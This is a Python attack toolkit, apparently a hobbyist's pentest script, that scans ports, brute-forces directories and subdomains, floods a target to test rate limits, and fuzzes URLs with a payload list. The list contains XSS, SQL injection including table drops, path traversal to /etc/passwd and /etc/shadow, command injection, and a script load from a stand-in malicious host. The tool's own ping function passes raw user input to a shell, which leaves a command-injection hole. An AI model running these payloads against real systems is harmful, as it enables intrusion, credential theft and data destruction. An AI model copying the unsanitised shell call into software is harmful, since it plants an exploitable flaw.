import os
import socket
import requests
import time
import whois
import urllib.parse
import sys
import threading

ports = [22, 21, 20, 23, 25, 53, 67, 68, 69, 80, 110, 123, 139, 143, 161, 443, 445, 3389]
def port_scanner():
    target = input("Enter Target IP or Domain: ")
    for port in ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)

            res = s.connect_ex((target, port))

            if res == 0:
                print(f'[+] Port {port} is open')
            else:
                print(f'[-] Port {port} is closed')
        except KeyboardInterrupt:
            print('ctrl + c detected Exiting...')



def ping():
    target = input("Enter Target IP or Domain: ")
    try:
        res = os.system(f'ping {target}')

        if res == 0:
            print('Target reachable')
        else:
            print("Target not reachable")
    except KeyboardInterrupt:
        print('ctrl + c detected Exiting...')





def dns():
    hostname = input('Enter hostname exmp(google.com): ')
    try:
        ip_address = socket.gethostbyname(hostname)
        print("Getting IP...")
        time.sleep(3)
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"IP address of {hostname}: {ip_address}")
    except socket.gaierror as e:
        print(f"Error resolving {hostname}: {e}")




def dirb():
    target = input('Enter Target url: ')
    word_list = input('Enter list you want to use if you dont have one use(dirb.txt): ')
    try:
        with open(word_list, 'r') as f:
            words = f.read().splitlines()

        for word in words:
            full_url = f'{target}/{word}'

            data = requests.get(full_url)

            if data.status_code == 200:
                print(f'200 --> Found {full_url}')
            elif data.status_code == 301 or data.status_code == 302:
                print(f'{data.status_code} --> Redirected: {full_url}')
            elif data.status_code == 403:
                print(f'Forbidden --> {full_url}')
            elif data.status_code == 404:
                print(f'Not found --> {full_url}')
            else:
                pass
    except KeyboardInterrupt:
        print('ctrl + c detected Exiting...')





def rate_limit_tester():
    warning = input('If the rate limit test seems to be slow. That means that your network communication is slow or The server protects him self well Press enter to continue: ')
    os.system('cls' if os.name == 'nt' else 'clear')
    target = input('Enter target IP or url: ')
    request_max = int(input('Enter how much requests to send exmp(50): '))

    for i in range(request_max):
        resp = requests.get(target)

        print(f'Request {i+1} == {resp.status_code}')

        if resp.status_code == 429:
            print(f'Rate limit got hit after {i+1} requests.')
            reset_time = resp.headers.get('Retry-After')

            if reset_time:
                print(f"New requests in {reset_time} seconds allowed.")
            break
        elif resp.status_code == 503:
                print(f'Server temporarily unavailable (503) after {i+1} requests.')
                break

        time.sleep(0.05)


def reverse_dns():
    ip = input("Enter IP address: ")
    
    try:
        result = socket.gethostbyaddr(ip)
        print("Hostname:", result[0])
        print("Aliases:", result[1])
        print("IP list:", result[2])
    
    except socket.herror:
        print("No reverse DNS entry found")




def ip_geo():

    ip = input("IP: ")

    

    r = requests.get(f"http://ip-api.com/json/{ip}")
    print(r.json())



def subfinder():
    target = input('Enter Domain not url: ')
    protocol = input('Enter protocol for the website you choose (https/http): ')
    subdomains = [
    "www", "mail", "api", "dev", "test", "beta", "ftp", "blog", "shop", "admin", "portal",
    "m", "webmail", "static", "cdn", "support", "secure", "devops", "monitor", "status", "staging",
    "files", "downloads", "docs", "cloud", "intranet", "calendar", "store", "news", "contact", "help",
    "sms", "ads", "crm", "push", "dev2", "images", "video", "file", "content", "support2", "customers",
    "api2", "auth", "gateway", "signin", "signup", "management", "public", "private", "resource", 
    "v1", "v2", "v3", "ssl", "adminpanel", "backend", "dashboard", "reports", "updates", "events",
    "data", "analytics", "apps", "app", "app2", "ticket", "verify", "appstore", "storefront", 
    "api-dev", "production", "test2", "test3", "sandbox", "helpdesk", "employees", "hr", "accounting",
    "login", "admin1", "admin2", "portal2", "enterprise", "public-api", "private-api", "api-test",
    "members", "partners", "partner", "corporate", "client", "clients", "projects", "services", "tools"
]
    session = requests.Session()

    for domain in subdomains:
        url = f'{protocol}://{domain}.{target}'

        
        try:
            resp = session.get(url, timeout=3)
            
            if resp.status_code == 200:
                print(f'Sub domain found --> {url}')
            elif resp.status_code == 403:
                print(f'Sub domain found but Forbidden --> {url}')
            elif resp.status_code == 404:
                print(f'Sub not found --> {url}')
            else:
                print(f"[?] {resp.status_code} --> {url}")
        except requests.exceptions.RequestException:
            pass
        


def whois_lookup():
    target = input('Enter domain: ')
    w = whois.whois(target)
    print(w)


def search_robots():
    warning = input("[INFO] No output does not necessarily mean the target is secure. Press Enter to continue. ")
    target = input('Enter target url: ')
     
    url = f'{target}/robots.txt'

    data = requests.get(url)
    
    if data.status_code == 200:
        print(f'[+] Successfull found robots.txt --> {url}')
    else:
        print(f'[-] No robots.txt file was found {url}')



def simple_fuzzing():
    target = input('Enter target url: ')

    fuzzing_payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    '<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>',
    "' OR 1=1 --",
    "' UNION SELECT null, null, null, null --",
    "<svg/onload=alert('XSS')>",
    "' OR 'a'='a",
    "; DROP TABLE users;",
    "<body onload=alert('XSS')>",
    "' or 1=1;--",
    "<svg><script>alert('XSS')</script></svg>",
    "<svg><image src='x' onerror='alert(\"XSS\")'></svg>",
    "' DROP DATABASE mydb; --",
    "<iframe src='javascript:alert('XSS');'></iframe>",
    "%00", 
    "../../../../etc/passwd",
    "../../../../etc/shadow",
    "../../../bin/bash",
    "../../../var/www/html/index.php",
    "..\\..\\..\\..\\..\\windows\\system32\\config",
    "..%5C..%5C..%5C..%5C..%5Cetc%5Cpasswd",
    "<script src='http://malicious.com/malicious.js'></script>",
    "</script><img src='x' onerror='alert('XSS')'>",
    "<img src='x' onerror='alert(1)'>",
    "<svg><script>alert('XSS')</script></svg>",
    "<script>alert('XSS')</script>",
    "<svg onload=alert(1)>",
    "; ls",
    "; id",
    "; whoami",
    "; uname -a",
    "; cat /etc/passwd",
    
]
    for payload in fuzzing_payloads:
        encoded = urllib.parse.quote(payload)
        url = f'{target}?q={encoded}'

        try:
            resp = requests.get(url)

            print(f'Testing: {payload}')

            if payload in resp.text:
                print(f"[!] Possible vulnerability found with payload: {payload} --> {url}")


            if encoded in resp.text:
                print("  [!] Reflected (encoded)")
            
            if resp.status_code >= 500:
                print('[!] Server Error')

        except requests.exceptions.RequestException:
            print("[!] Request failed")


def main():
    print('''


                                                                                               
 _|_|_|_|  _|                          _|_|_|_|_|                    _|      _|      _|    _|  
 _|        _|    _|_|    _|    _|          _|      _|_|      _|_|    _|      _|      _|  _|_|  
 _|_|_|    _|  _|_|_|_|    _|_|            _|    _|    _|  _|    _|  _|      _|      _|    _|  
 _|        _|  _|        _|    _|          _|    _|    _|  _|    _|  _|        _|  _|      _|  
 _|        _|    _|_|_|  _|    _|          _|      _|_|      _|_|    _|          _|    _|  _|  
                                                                                               
                                                                                               
''')
    print('Made by Glitch')
    print('=' * 30)
    print('1) Ping scan')
    print('2) Port scan')
    print('3) DNS Lookup')
    print('4) Reverse DNS Lookup')
    print('5) Dirb')
    print('6) IP geolocate')
    print('7) Whois Lookup')
    print('8) Subdomain finder')
    print('9) Rate Limit tester')
    print('10) Robots file search')
    print('11) Simple fuzzing\n')
    print('99) Exit')

    print('=' * 30)

    print('')

    inp = int(input('Enter your choice(1-11l): '))
    if inp == 1:
        os.system('cls' if os.name == 'nt' else 'clear')
        ping()
    elif inp == 2:
        os.system('cls' if os.name == 'nt' else 'clear')
        port_scanner()
    elif inp == 3:
        os.system('cls' if os.name == 'nt' else 'clear')
        dns()
    elif inp == 4:
        os.system('cls' if os.name == 'nt' else 'clear')
        reverse_dns()
    elif inp == 5:
        os.system('cls' if os.name == 'nt' else 'clear')
        dirb()
    elif inp == 6:
        os.system('cls' if os.name == 'nt' else 'clear')
        ip_geo()
    elif inp == 7:
        os.system('cls' if os.name == 'nt' else 'clear')
        whois_lookup()
    elif inp == 8:
        os.system('cls' if os.name == 'nt' else 'clear')
        subfinder()
    elif inp == 9:
        os.system('cls' if os.name == 'nt' else 'clear')
        rate_limit_tester()
    elif inp == 10:
        os.system('cls' if os.name == 'nt' else 'clear')
        search_robots()
    elif inp == 11:
        os.system('cls' if os.name == 'nt' else 'clear')
        simple_fuzzing()
    elif inp == 99:
        exit()

if __name__ == '__main__':
    main()